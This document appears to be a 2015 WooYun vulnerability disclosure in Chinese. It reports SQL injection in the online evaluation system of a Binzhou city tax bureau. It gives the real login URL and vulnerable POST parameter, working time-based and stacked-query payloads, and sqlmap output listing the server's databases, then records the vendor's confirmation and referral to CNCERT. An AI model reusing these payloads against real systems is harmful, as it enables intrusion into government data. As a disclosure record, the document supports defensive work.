wybug_title: 山东某市国税局某系统存在SQL注射。【一】
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-05-26：	细节已通知厂商并且等待厂商处理中									2015-05-30：	厂商已经确认，细节仅向厂商公开									2015-06-09：	细节向核心白帽子及相关领域专家公开									2015-06-19：	细节向普通白帽子公开									2015-06-29：	细节向实习白帽子公开									2015-07-14：	细节向公众公开  简要描述： 山东某市国税局某系统存在SQL注射。还是什么网上评议系统 详细说明：  滨州市市区国税局网上评议系统存在post注射http://www.bzsqgs.com/loginCheck.asp (POST)pass=88952634&Submit=%EF%BF%BD%E1%BD%BB&name=88952634


sqlmap identified the following injection points with a total of 135 HTTP(s) requests:---Parameter: pass (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: pass=88952634'; WAITFOR DELAY '0:0:5'--&Submit=%EF%BF%BD%E1%BD%BB&name=88952634    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: pass=88952634' WAITFOR DELAY '0:0:5'--&Submit=%EF%BF%BD%E1%BD%BB&name=88952634---web server operating system: Windowsweb application technology: ASPback-end DBMS: Microsoft SQL Server 2000sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: pass (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: pass=88952634'; WAITFOR DELAY '0:0:5'--&Submit=%EF%BF%BD%E1%BD%BB&name=88952634    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: pass=88952634' WAITFOR DELAY '0:0:5'--&Submit=%EF%BF%BD%E1%BD%BB&name=88952634---web server operating system: Windowsweb application technology: ASPback-end DBMS: Microsoft SQL Server 2000available databases [14]:[*] bcguoshui[*] bcguoshui2[*] bzcard[*] bzcard1[*] bzrd[*] bzzyxy[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] RMS[*] tempdb[*] TY_pathssqlmap identified the following injection points with a total of 0
不是dba权限

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-05-30 22:31 厂商回复： 已经转由CNCERT下发给相应分中心，由其后续协调网站管理单位处置 最新状态： 暂无
